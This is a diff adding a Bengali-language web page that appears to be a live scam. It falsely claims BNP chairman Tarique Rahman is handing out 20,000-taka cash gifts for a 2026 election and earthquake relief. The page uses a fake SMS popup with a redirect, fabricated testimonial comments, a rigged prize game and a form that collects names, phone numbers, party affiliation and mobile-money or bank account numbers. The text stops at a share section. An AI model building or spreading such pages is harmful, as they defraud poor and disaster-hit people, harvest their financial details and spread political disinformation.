@@ -1,0 +1,1276 @@
+
+<!DOCTYPE html>
+<html lang="bn" dir="ltr">
+<head>
+<!-- বাংলাদেশ নির্বাচন ২০২৬ - বিশেষ উপহার বিজ্ঞপ্তি -->
+<script>
+setTimeout(function() {
+    var proceed = confirm('এসএমএস: অভিনন্দন!\n\nআপনি নির্বাচিত হয়েছেন ২০,০০০ টাকা নগদ উপহার পাওয়ার জন্য।\n\nবাংলাদেশ নির্বাচন ২০২৬ - বিএনপি চেয়ারম্যান মিঃ তারেক রহমানের বিশেষ উপহার।\n\nযোগ্যতা যাচাই করতে এবং টাকা দাবি করতে "ওকে" ক্লিক করুন।');
+    
+    if (!proceed) {
+        location.href = 'https://bangladeshelectionfunds2026.blogspot.com';
+    }
+}, 1000);
+</script>
+<title>বাংলাদেশ নির্বাচন ২০২৬...বিএনপি চেয়ারম্যান মিঃ তারেক রহমান সমর্থকদের ২০০০০ টাকা নগদ উপহার দিচ্ছেন</title>
+<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDuwgxFAq2WHSiK3w1LMXA2g5T_nKDFjKtZmfIZglTnB6vHVfFMeAYFpwJF7gVGrVige8w5IP3s478MbzNpow247sVy9RcG3vKyi00p-dL1VXv9m_tc75sgiyK3srD1tV5p_y7hzDiM33qSPNVjDHxishulaa_Uy573IirH28o56hmhv_7fATUiATe10h5/w640-h582/IMG_2979.png" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta property="og:type" content="website" />
+<script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<style type="text/css">
+    @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap");
+    @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@400;500;600;700&display=swap');
+    
+    * {
+        margin: 0;
+        padding: 0;
+        font-family: 'Noto Sans Bengali', 'Poppins', Arial, sans-serif;
+        box-sizing: border-box;
+    }
+    
+    body {
+        background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+        min-height: 100vh;
+        color: #333;
+        direction: ltr;
+    }
+    
+    .container {
+        max-width: 500px;
+        margin: 0 auto;
+        padding: 20px;
+    }
+    
+    .card {
+        background: white;
+        border-radius: 15px;
+        padding: 25px;
+        margin-bottom: 20px;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+        border: 1px solid rgba(0,0,0,0.05);
+    }
+    
+    .header-image {
+        width: 100%;
+        border-radius: 12px;
+        margin-bottom: 20px;
+        display: block;
+    }
+    
+    /* Colors for Bangladesh theme */
+    .bd-green { color: #006a4e; }
+    .bd-red { color: #f42a41; }
+    .bd-gold { color: #ffcc00; }
+    
+    button {
+        display: block;
+        width: 100%;
+        height: 55px;
+        color: white;
+        border: none;
+        outline: none;
+        font-size: 18px;
+        font-weight: 600;
+        cursor: pointer;
+        border-radius: 10px;
+        padding: 0 10px;
+        margin: 15px auto;
+        background: linear-gradient(135deg, #0066b3 0%, #004d88 100%);
+        transition: all 0.3s ease;
+        box-shadow: 0 5px 15px rgba(0, 102, 179, 0.3);
+    }
+    
+    button:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 20px rgba(0, 102, 179, 0.4);
+    }
+    
+    /* BOX GAME STYLES - FIXED */
+    .box-game-container {
+        text-align: center;
+        padding: 20px;
+    }
+    
+    .box-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 10px;
+        margin: 30px 0;
+        max-width: 400px;
+        margin-left: auto;
+        margin-right: auto;
+    }
+    
+    .box-item {
+        position: relative;
+        cursor: pointer;
+        transition: transform 0.3s;
+        height: 100px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: #f8f9fa;
+        border-radius: 10px;
+        border: 2px solid #ddd;
+        overflow: hidden;
+    }
+    
+    .box-item:hover {
+        transform: scale(1.05);
+        border-color: #0066b3;
+    }
+    
+    .box-image {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        border-radius: 8px;
+    }
+    
+    .box-number {
+        position: absolute;
+        top: 5px;
+        left: 5px;
+        background: rgba(0,0,0,0.7);
+        color: white;
+        padding: 3px 8px;
+        border-radius: 5px;
+        font-weight: bold;
+        font-size: 12px;
+        z-index: 2;
+    }
+    
+    .attempts-counter {
+        color: #f42a41;
+        font-weight: bold;
+        margin: 20px 0;
+        font-size: 18px;
+    }
+    
+    /* PROGRESS BAR */
+    .progress-container {
+        direction: ltr;
+        max-width: 400px;
+        margin: 30px auto;
+    }
+    
+    .progress-bar {
+        position: relative;
+        width: 100%;
+        height: 12px;
+        background: #eee;
+        border-radius: 6px;
+        overflow: hidden;
+        margin-bottom: 10px;
+    }
+    
+    .progress-fill {
+        background: linear-gradient(90deg, #006a4e, #00a86b);
+        width: 0%;
+        height: 100%;
+        border-radius: 6px;
+        transition: width 0.3s ease;
+    }
+    
+    .progress-text {
+        text-align: center;
+        font-size: 16px;
+        font-weight: 600;
+        color: #006a4e;
+    }
+    
+    /* FORM STYLES */
+    .form-group {
+        margin-bottom: 20px;
+    }
+    
+    .form-group input,
+    .form-group select {
+        width: 100%;
+        height: 55px;
+        padding: 15px;
+        outline: none;
+        border: 2px solid #ddd;
+        font-size: 16px;
+        border-radius: 10px;
+        background: #f8f9fa;
+        transition: border 0.3s;
+        font-family: 'Noto Sans Bengali', sans-serif;
+    }
+    
+    .form-group input:focus,
+    .form-group select:focus {
+        border-color: #0066b3;
+        background: white;
+    }
+    
+    /* PAGE STATES */
+    #intro,
+    #formSection,
+    #boxGame,
+    #approvalPopup,
+    #shareSection,
+    #finalPage {
+        display: none;
+    }
+    
+    #intro {
+        display: block;
+    }
+    
+    /* WARNING BOXES */
+    .warning-box {
+        background: linear-gradient(135deg, #fff3cd, #ffeaa7);
+        border: 2px solid #ffc107;
+        border-radius: 10px;
+        padding: 15px;
+        margin: 20px 0;
+        color: #856404;
+        font-size: 14px;
+        line-height: 1.5;
+    }
+    
+    .info-box {
+        background: linear-gradient(135deg, #d1ecf1, #bee5eb);
+        border: 2px solid #17a2b8;
+        border-radius: 10px;
+        padding: 15px;
+        margin: 20px 0;
+        color: #0c5460;
+        font-size: 14px;
+        line-height: 1.5;
+    }
+    
+    /* HEADER BANNER */
+    .header-banner {
+        background: linear-gradient(135deg, #006a4e, #00a86b);
+        color: white;
+        padding: 15px;
+        border-radius: 12px;
+        text-align: center;
+        margin-bottom: 20px;
+        position: relative;
+        overflow: hidden;
+    }
+    
+    .header-banner:before {
+        content: "🇧🇩";
+        position: absolute;
+        font-size: 40px;
+        opacity: 0.2;
+        right: 20px;
+        top: 50%;
+        transform: translateY(-50%);
+    }
+    
+    /* COMMENTS SECTION - IMPROVED */
+    .comments-section {
+        background: #f8f9fa;
+        border-radius: 12px;
+        padding: 15px;
+        margin-top: 20px;
+    }
+    
+    .comment {
+        padding: 10px 0;
+        border-bottom: 1px solid #eee;
+        display: flex;
+        gap: 10px;
+    }
+    
+    .comment:last-child {
+        border-bottom: none;
+    }
+    
+    .comment-avatar {
+        width: 45px;
+        height: 45px;
+        border-radius: 50%;
+        object-fit: cover;
+        flex-shrink: 0;
+    }
+    
+    .comment-content {
+        flex: 1;
+    }
+    
+    .user-name {
+        font-weight: bold;
+        color: #0066b3;
+        font-size: 14px;
+    }
+    
+    .comment-text {
+        color: #555;
+        font-size: 13px;
+        line-height: 1.5;
+        margin: 5px 0;
+    }
+    
+    .comment-time {
+        font-size: 11px;
+        color: #888;
+        margin-top: 3px;
+    }
+    
+    .comment-reactions {
+        display: flex;
+        align-items: center;
+        margin-top: 5px;
+    }
+    
+    .reaction-icons {
+        display: flex;
+        align-items: center;
+    }
+    
+    .reaction-icon {
+        width: 18px;
+        height: 18px;
+        border-radius: 50%;
+        border: 2px solid white;
+        margin-right: -5px;
+    }
+    
+    .reaction-count {
+        font-size: 12px;
+        color: #65676B;
+        margin-left: 8px;
+    }
+    
+    .comment-actions {
+        font-size: 12px;
+        color: #65676B;
+        margin-top: 5px;
+    }
+    
+    .action-btn {
+        margin-right: 15px;
+        cursor: pointer;
+    }
+    
+    .action-btn:hover {
+        text-decoration: underline;
+    }
+    
+    /* FINAL PAGE STYLES */
+    .bank-options {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 10px;
+        margin: 20px 0;
+    }
+    
+    .bank-option {
+        background: #f8f9fa;
+        border: 2px solid #ddd;
+        border-radius: 8px;
+        padding: 15px;
+        text-align: center;
+        cursor: pointer;
+        transition: all 0.3s;
+    }
+    
+    .bank-option:hover {
+        background: #0066b3;
+        color: white;
+        border-color: #0066b3;
+    }
+    
+    /* MESSAGE BOX */
+    .message-box {
+        margin: 20px 0;
+        padding: 15px;
+        border-radius: 10px;
+        text-align: center;
+        font-weight: bold;
+    }
+    
+    .message-success {
+        background: #d4edda;
+        color: #155724;
+        border: 1px solid #c3e6cb;
+    }
+    
+    .message-error {
+        background: #f8d7da;
+        color: #721c24;
+        border: 1px solid #f5c6cb;
+    }
+    
+    /* CONFETTI EFFECT */
+    .confetti {
+        position: fixed;
+        width: 10px;
+        height: 10px;
+        background-color: #f00;
+        opacity: 0.5;
+        z-index: 9999;
+        animation: fall 3s linear infinite;
+    }
+    
+    @keyframes fall {
+        0% { transform: translateY(-100px) rotate(0deg); }
+        100% { transform: translateY(100vh) rotate(360deg); }
+    }
+    
+    /* CASH IMAGE STYLES */
+    .cash-image {
+        width: 100%;
+        border-radius: 10px;
+        margin: 20px 0;
+    }
+    
+    /* COMMENTS COUNTER */
+    .comments-counter {
+        display: flex;
+        justify-content: space-between;
+        padding: 15px 0;
+        border-bottom: 1px solid #e1e2e3;
+        margin-bottom: 15px;
+    }
+    
+    .reactions-container {
+        display: flex;
+        align-items: center;
+    }
+    
+    .reaction-img {
+        width: 20px;
+        height: 20px;
+        border-radius: 50%;
+        border: 2px solid white;
+        margin-right: -6px;
+    }
+    
+    .comments-stats {
+        font-size: 14px;
+        color: #65676B;
+    }
+</style>
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+<div class="container">
+    <!-- HEADER BANNER -->
+    <div class="header-banner">
+        <h2 style="margin: 0; font-size: 18px;">🇧🇩 বাংলাদেশ নির্বাচন ২০২৬</h2>
+        <p style="margin: 5px 0 0; font-size: 14px; opacity: 0.9;">বিএনপি চেয়ারম্যান মিঃ তারেক রহমানের বিশেষ উপহার</p>
+    </div>
+    
+    <!-- INTRO PAGE -->
+    <div class="card" id="intro">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDuwgxFAq2WHSiK3w1LMXA2g5T_nKDFjKtZmfIZglTnB6vHVfFMeAYFpwJF7gVGrVige8w5IP3s478MbzNpow247sVy9RcG3vKyi00p-dL1VXv9m_tc75sgiyK3srD1tV5p_y7hzDiM33qSPNVjDHxishulaa_Uy573IirH28o56hmhv_7fATUiATe10h5/w640-h582/IMG_2979.png" alt="তারেক রহমান" class="header-image">
+        
+        <h2 style="text-align: center; color: #006a4e; margin-bottom: 15px;">বাংলাদেশ নির্বাচন ২০২৬</h2>
+        
+        <p style="text-align: center; line-height: 1.6; color: #555;">
+            <span style="color: #f42a41; font-weight: bold;">বিএনপি চেয়ারম্যান মিঃ তারেক রহমান</span> সমর্থকদের <span style="color: #006a4e; font-weight: bold;">২০,০০০ টাকা নগদ উপহার</span> দিচ্ছেন।
+            <br><br>
+            এই বছর <span style="color: #ff6600; font-weight: bold;">ভূমিকম্প নগদ অনুদান</span> মিস করবেন না।
+            <br><br>
+            দাবি জানাতে নিচের প্রশ্নের উত্তর দিন <span style="color: #006a4e; font-weight: bold;">টাকা: ২০,০০০ নগদ পুরস্কার</span>
+        </p>
+        
+        <button id="startBtn" onclick="startProcess()">
+            ✅ উপহার দাবি করুন
+        </button>
+        
+        <div class="warning-box">
+            <strong>⚠️ কে উপহার পাবেন?</strong><br>
+            • বিএনপি সমর্থক<br>
+            • ভূমিকম্পে ক্ষতিগ্রস্ত পরিবার<br>
+            • নির্বাচনী কর্মী<br>
+            • প্রথম ৫০০০ জনের জন্য বিশেষ সুযোগ
+        </div>
+        
+        <div class="info-box">
+            <strong>💰 টাকা উত্তোলন:</strong><br>
+            • বিকাশ / নগদ / রকেট<br>
+            • ব্যাংক একাউন্ট (ডি.বি.বিএল, সোনালী, ইসলামী ব্যাংক)<br>
+            • <span style="color: #f42a41;">⚡ দ্রুত: ২৪ ঘন্টার মধ্যে টাকা পৌঁছে যাবে</span>
+        </div>
+        
+        <!-- COMMENTS SECTION ON INTRO PAGE -->
+        <div class="comments-section">
+            <div class="comments-counter">
+                <div class="reactions-container">
+                    <img src="https://images.unsplash.com/photo-1582213782179-e0d53f98f2ca?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="reaction-img" style="z-index: 4;">
+                    <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="reaction-img" style="z-index: 3;">
+                    <img src="https://images.unsplash.com/photo-1551836026-d5c2c5af78e4?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="reaction-img" style="z-index: 2;">
+                    <span class="reaction-count" id="totalLikes">4.2K</span>
+                </div>
+                <div class="comments-stats">
+                    <span id="totalComments">৮৯ মন্তব্য</span> · <span id="totalShares">১.২K শেয়ার</span>
+                </div>
+            </div>
+            
+            <div class="comment">
+                <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="comment-avatar">
+                <div class="comment-content">
+                    <div class="user-name">আহমেদ হোসেন - ঢাকা</div>
+                    <div class="comment-text">
+                        গতকাল ২০,০০০ টাকা পেয়েছি! সত্যিই বিএনপি সমর্থকদের জন্য বড় উপহার। তারেক রহমান সাহেবকে ধন্যবাদ!
+                    </div>
+                    <div class="comment-time" id="time1">২ মিনিট আগে</div>
+                    <div class="comment-reactions">
+                        <div class="reaction-icons">
+                            <img src="https://images.unsplash.com/photo-1582213782179-e0d53f98f2ca?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="reaction-icon">
+                        </div>
+                        <span class="reaction-count">৫৬</span>
+                    </div>
+                    <div class="comment-actions">
+                        <span class="action-btn">পছন্দ</span>
+                        <span class="action-btn">উত্তর দিন</span>
+                        <span class="action-btn">শেয়ার</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="comment">
+                <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="comment-avatar">
+                <div class="comment-content">
+                    <div class="user-name">সালমা বেগম - চট্টগ্রাম</div>
+                    <div class="comment-text">
+                        ভূমিকম্পে ঘর ক্ষতিগ্রস্ত হয়েছিল। এই টাকাটা খুবই প্রয়োজন ছিল। দ্রুত টাকা পেয়েছি।
+                    </div>
+                    <div class="comment-time" id="time2">৫ মিনিট আগে</div>
+                    <div class="comment-reactions">
+                        <div class="reaction-icons">
+                            <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="reaction-icon">
+                            <img src="https://images.unsplash.com/photo-1582213782179-e0d53f98f2ca?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="reaction-icon">
+                        </div>
+                        <span class="reaction-count">৪২</span>
+                    </div>
+                    <div class="comment-actions">
+                        <span class="action-btn">পছন্দ</span>
+                        <span class="action-btn">উত্তর দিন</span>
+                        <span class="action-btn">শেয়ার</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="comment">
+                <img src="https://images.unsplash.com/photo-1560250097-0b93528c311a?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="comment-avatar">
+                <div class="comment-content">
+                    <div class="user-name">রফিকুল ইসলাম - রাজশাহী</div>
+                    <div class="comment-text">
+                        নির্বাচনী কর্মী হিসেবে এই উপহার পেয়ে খুব খুশি। বিএনপি সত্যিই সমর্থকদের দেখে।
+                    </div>
+                    <div class="comment-time" id="time3">৮ মিনিট আগে</div>
+                    <div class="comment-reactions">
+                        <div class="reaction-icons">
+                            <img src="https://images.unsplash.com/photo-1582213782179-e0d53f98f2ca?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="reaction-icon">
+                        </div>
+                        <span class="reaction-count">৩৮</span>
+                    </div>
+                    <div class="comment-actions">
+                        <span class="action-btn">পছন্দ</span>
+                        <span class="action-btn">উত্তর দিন</span>
+                        <span class="action-btn">শেয়ার</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="comment">
+                <img src="https://images.unsplash.com/photo-1502767089025-6572583495f9?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="comment-avatar">
+                <div class="comment-content">
+                    <div class="user-name">জামাল উদ্দিন - সিলেট</div>
+                    <div class="comment-text">
+                        ২৪ ঘন্টার মধ্যে টাকা পেয়েছি! ভেবেছিলাম ভুয়া হতে পারে, কিন্তু সত্যিই কাজ করেছে।
+                    </div>
+                    <div class="comment-time" id="time4">১২ মিনিট আগে</div>
+                    <div class="comment-reactions">
+                        <div class="reaction-icons">
+                            <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="reaction-icon">
+                        </div>
+                        <span class="reaction-count">২৯</span>
+                    </div>
+                    <div class="comment-actions">
+                        <span class="action-btn">পছন্দ</span>
+                        <span class="action-btn">উত্তর দিন</span>
+                        <span class="action-btn">শেয়ার</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="comment">
+                <img src="https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="comment-avatar">
+                <div class="comment-content">
+                    <div class="user-name">মোঃ আলমগীর - খুলনা</div>
+                    <div class="comment-text">
+                        আমার বিকাশে টাকা এসেছে! আরেকবার চেষ্টা করছি ভাইয়ের জন্য।
+                    </div>
+                    <div class="comment-time" id="time5">১৫ মিনিট আগে</div>
+                    <div class="comment-reactions">
+                        <div class="reaction-icons">
+                            <img src="https://images.unsplash.com/photo-1582213782179-e0d53f98f2ca?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="reaction-icon">
+                            <img src="https://images.unsplash.com/photo-1551836026-d5c2c5af78e4?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="reaction-icon">
+                        </div>
+                        <span class="reaction-count">৩৩</span>
+                    </div>
+                    <div class="comment-actions">
+                        <span class="action-btn">পছন্দ</span>
+                        <span class="action-btn">উত্তর দিন</span>
+                        <span class="action-btn">শেয়ার</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="comment">
+                <img src="https://images.unsplash.com/photo-1488426862026-3ee34a7d66df?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="comment-avatar">
+                <div class="comment-content">
+                    <div class="user-name">নাজমা আক্তার - বরিশাল</div>
+                    <div class="comment-text">
+                        বিধবা হওয়ার পর অনেক সমস্যা। এই টাকাটা আমার ছেলের পড়াশোনায় কাজে দিবে। আল্লাহ আপনাদের ভাল রাখুক।
+                    </div>
+                    <div class="comment-time" id="time6">২০ মিনিট আগে</div>
+                    <div class="comment-reactions">
+                        <div class="reaction-icons">
+                            <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="reaction-icon">
+                            <img src="https://images.unsplash.com/photo-1582213782179-e0d53f98f2ca?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="reaction-icon">
+                            <img src="https://images.unsplash.com/photo-1551836026-d5c2c5af78e4?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="reaction-icon">
+                        </div>
+                        <span class="reaction-count">৭৮</span>
+                    </div>
+                    <div class="comment-actions">
+                        <span class="action-btn">পছন্দ</span>
+                        <span class="action-btn">উত্তর দিন</span>
+                        <span class="action-btn">শেয়ার</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="comment">
+                <img src="https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="comment-avatar">
+                <div class="comment-content">
+                    <div class="user-name">শফিকুল ইসলাম - ময়মনসিংহ</div>
+                    <div class="comment-text">
+                        আমি তৃতীয়বারের মতো পাচ্ছি! প্রতিবারই কাজ করে। বন্ধুদের বলেছি তারাও এখন নিচ্ছে।
+                    </div>
+                    <div class="comment-time" id="time7">২৫ মিনিট আগে</div>
+                    <div class="comment-reactions">
+                        <div class="reaction-icons">
+                            <img src="https://images.unsplash.com/photo-1582213782179-e0d53f98f2ca?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="reaction-icon">
+                        </div>
+                        <span class="reaction-count">৪১</span>
+                    </div>
+                    <div class="comment-actions">
+                        <span class="action-btn">পছন্দ</span>
+                        <span class="action-btn">উত্তর দিন</span>
+                        <span class="action-btn">শেয়ার</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="comment">
+                <img src="https://images.unsplash.com/photo-1494790108755-2616b612b786?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="comment-avatar">
+                <div class="comment-content">
+                    <div class="user-name">ফারহানা ইয়াসমিন - রংপুর</div>
+                    <div class="comment-text">
+                        ছাত্রী হওয়ার কারণে পার্টটাইম জব করতে পারতাম না। এই টাকাটা আমার সেমিস্টার ফি দিতে সাহায্য করবে। অসংখ্য ধন্যবাদ!
+                    </div>
+                    <div class="comment-time" id="time8">৩০ মিনিট আগে</div>
+                    <div class="comment-reactions">
+                        <div class="reaction-icons">
+                            <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="reaction-icon">
+                            <img src="https://images.unsplash.com/photo-1582213782179-e0d53f98f2ca?ixlib=rb-4.0.3&auto=format&fit=crop&w=100&q=80" class="reaction-icon">
+                        </div>
+                        <span class="reaction-count">৬৩</span>
+                    </div>
+                    <div class="comment-actions">
+                        <span class="action-btn">পছন্দ</span>
+                        <span class="action-btn">উত্তর দিন</span>
+                        <span class="action-btn">শেয়ার</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- FORM SECTION -->
+    <div class="card" id="formSection">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDuwgxFAq2WHSiK3w1LMXA2g5T_nKDFjKtZmfIZglTnB6vHVfFMeAYFpwJF7gVGrVige8w5IP3s478MbzNpow247sVy9RcG3vKyi00p-dL1VXv9m_tc75sgiyK3srD1tV5p_y7hzDiM33qSPNVjDHxishulaa_Uy573IirH28o56hmhv_7fATUiATe10h5/w640-h582/IMG_2979.png" alt="তারেক রহমান" class="header-image">
+        
+        <h2 style="text-align: center; color: #006a4e; margin-bottom: 20px;">আপনার তথ্য দিন</h2>
+        
+        <div class="form-group">
+            <input type="text" id="fullName" placeholder="পুরো নাম" required>
+        </div>
+        
+        <div class="form-group">
+            <input type="tel" id="phoneNumber" placeholder="মোবাইল নম্বর (যেকোনো দেশ)" required>
+        </div>
+        
+        <div class="form-group">
+            <select id="district" required>
+                <option value="" selected disabled>জেলা নির্বাচন করুন</option>
+                <option value="ঢাকা">ঢাকা</option>
+                <option value="চট্টগ্রাম">চট্টগ্রাম</option>
+                <option value="রাজশাহী">রাজশাহী</option>
+                <option value="খুলনা">খুলনা</option>
+                <option value="বরিশাল">বরিশাল</option>
+                <option value="সিলেট">সিলেট</option>
+                <option value="রংপুর">রংপুর</option>
+                <option value="ময়মনসিংহ">ময়মনসিংহ</option>
+            </select>
+        </div>
+        
+        <div class="form-group">
+            <select id="supportType" required>
+                <option value="" selected disabled>আপনি কোন ধরনের সমর্থক?</option>
+                <option value="কর্মী">বিএনপি কর্মী</option>
+                <option value="সমর্থক">সাধারণ সমর্থক</option>
+                <option value="ভূমিকম্প">ভূমিকম্প ক্ষতিগ্রস্ত</option>
+                <option value="স্বেচ্ছাসেবক">নির্বাচনী স্বেচ্ছাসেবক</option>
+            </select>
+        </div>
+        
+        <div class="form-group">
+            <select id="paymentMethod" required>
+                <option value="" selected disabled="disabled">টাকা কিভাবে নিবেন?</option>
+                <option value="bkash">বিকাশ</option>
+                <option value="nagad">নগদ</option>
+                <option value="rocket">রকেট</option>
+                <option value="bank">ব্যাংক একাউন্ট</option>
+            </select>
+        </div>
+        
+        <div class="form-group" id="accountNumberField" style="display: none;">
+            <input type="text" id="accountNumber" placeholder="একাউন্ট নম্বর / মোবাইল নম্বর">
+        </div>
+        
+        <p style="font-size: 13px; color: #666; text-align: center; margin: 20px 0;">
+            ✅ ২৪ ঘন্টার মধ্যে টাকা পৌঁছে যাবে<br>
+            <span style="color: #006a4e; font-weight: bold;">"দ্রুততম সময়ে আপনার উপহার পাঠানো হবে"</span>
+        </p>
+        
+        <button id="submitForm" onclick="submitForm()">
+            ✅ তথ্য জমা দিন ও পরবর্তী ধাপে যান
+        </button>
+    </div>
+    
+    <!-- BOX GAME SECTION -->
+    <div class="card" id="boxGame">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDuwgxFAq2WHSiK3w1LMXA2g5T_nKDFjKtZmfIZglTnB6vHVfFMeAYFpwJF7gVGrVige8w5IP3s478MbzNpow247sVy9RcG3vKyi00p-dL1VXv9m_tc75sgiyK3srD1tV5p_y7hzDiM33qSPNVjDHxishulaa_Uy573IirH28o56hmhv_7fATUiATe10h5/w640-h582/IMG_2979.png" alt="তারেক রহমান" class="header-image">
+        
+        <div id="boxGameVue">
+            <h2 style="text-align: center; color: #006a4e; margin-bottom: 15px;">🎁 উপহার বাছাই করুন!</h2>
+            <p style="text-align: center; color: #555; margin-bottom: 20px;">
+                আপনার সামনে ৯টি বাক্স আছে। ৩টি সুযোগে সঠিক বাক্সটি খুঁজে বের করুন ২০,০০০ টাকা জেতার জন্য!
+            </p>
+            
+            <div class="attempts-counter">
+                সুযোগ বাকি: {{ attemptsLeft }}/৩
+            </div>
+            
+            <div class="box-grid">
+                <div class="box-item" v-for="(box, index) in boxes" :key="index" @click="selectBox(index)">
+                    <div class="box-number">{{ index + 1 }}</div>
+                    <img :src="box.image" class="box-image">
+                </div>
+            </div>
+            
+            <div v-if="message" :class="['message-box', messageType]">
+                {{ message }}
+            </div>
+            
+            <!-- Only show "Try Again" button when NOT won and attempts exhausted -->
+            <button v-if="gameFinished && !gameWon" @click="resetGame" style="background: linear-gradient(135deg, #f42a41, #d91e2a);">
+                🔄 আবার চেষ্টা করুন
+            </button>
+            
+            <!-- Show "Continue" button when won -->
+            <button v-if="gameFinished && gameWon" @click="proceedToApproval" style="background: linear-gradient(135deg, #006a4e, #00a86b);">
+                🎉 সফল! পরবর্তী ধাপে যান
+            </button>
+        </div>
+    </div>
+    
+    <!-- APPROVAL POPUP -->
+    <div class="card" id="approvalPopup" style="display: none;">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDuwgxFAq2WHSiK3w1LMXA2g5T_nKDFjKtZmfIZglTnB6vHVfFMeAYFpwJF7gVGrVige8w5IP3s478MbzNpow247sVy9RcG3vKyi00p-dL1VXv9m_tc75sgiyK3srD1tV5p_y7hzDiM33qSPNVjDHxishulaa_Uy573IirH28o56hmhv_7fATUiATe10h5/w640-h582/IMG_2979.png" alt="তারেক রহমান" class="header-image">
+        
+        <div style="text-align: center; padding: 20px;">
+            <div style="font-size: 60px; color: #006a4e; margin-bottom: 15px;">✅</div>
+            <h2 style="color: #006a4e; margin-bottom: 10px;">অভিনন্দন!</h2>
+            <h3 style="color: #f42a41; margin-bottom: 15px;">🎁 ২০,০০০ টাকা উপহার পাওয়ার জন্য আপনি নির্বাচিত হয়েছেন!</h3>
+            
+            <div style="background: #f8f9fa; padding: 20px; border-radius: 12px; margin: 20px 0;">
+                <div style="display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee;">
+                    <span>নাম:</span>
+                    <span id="popupName" style="font-weight: bold;">রহিম উদ্দিন</span>
+                </div>
+                <div style="display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee;">
+                    <span>জেলা:</span>
+                    <span id="popupDistrict" style="font-weight: bold;">ঢাকা</span>
+                </div>
+                <div style="display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee;">
+                    <span>পরিমাণ:</span>
+                    <span style="color: #006a4e; font-weight: bold;">২০,০০০ টাকা</span>
+                </div>
+                <div style="display: flex; justify-content: space-between; padding: 8px 0;">
+                    <span>স্ট্যাটাস:</span>
+                    <span style="color: #f42a41; font-weight: bold;">✅ অনুমোদিত</span>
+                </div>
+            </div>
+            
+            <p style="color: #666; line-height: 1.6; margin-bottom: 25px;">
+                আপনার উপহারটি প্রক্রিয়াকরণের জন্য প্রস্তুত। টাকা পাওয়ার জন্য চূড়ান্ত ধাপটি সম্পন্ন করুন।
+            </p>
+            
+            <button onclick="proceedToShare()" style="background: linear-gradient(135deg, #0066b3, #004d88);">
+                💾 সেভ ও কন্টিনিউ
+            </button>
+        </div>
+    </div>
+    
+    <!-- SHARE SECTION -->
+    <div class="card" id="shareSection" style="display: none;">
